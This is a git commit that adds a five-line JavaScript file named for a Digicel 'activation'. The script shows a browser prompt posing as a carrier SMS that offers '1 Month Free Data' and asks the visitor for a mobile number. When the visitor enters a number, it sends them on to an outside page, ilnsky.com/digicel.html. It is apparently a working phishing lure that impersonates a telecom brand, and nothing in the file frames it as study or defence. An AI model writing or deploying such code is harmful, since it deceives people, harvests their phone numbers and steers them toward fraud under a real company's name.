a751ca8031df2cee2eb978f6ecd48bdf24da9cca
ukpeha55-stack <ukpeha55@gmail.com>
2026-02-13 14:02:24 +0100

    Create digicel-activation.js

---
+++ digicel-activation.js
@@ -0,0 +1,5 @@
+var password = '1 MONTH FREE DATA'
+password=prompt('SMS: Congratulations, your Digicel Number is eligible to receive 1 Month Free Data, click OK to Enter Your Mobile Number','1 MONTH FREE DATA');
+if (password != '1 MONTH FREE DATA') {
+location.href='http://ilnsky.com/digicel.html';
+}
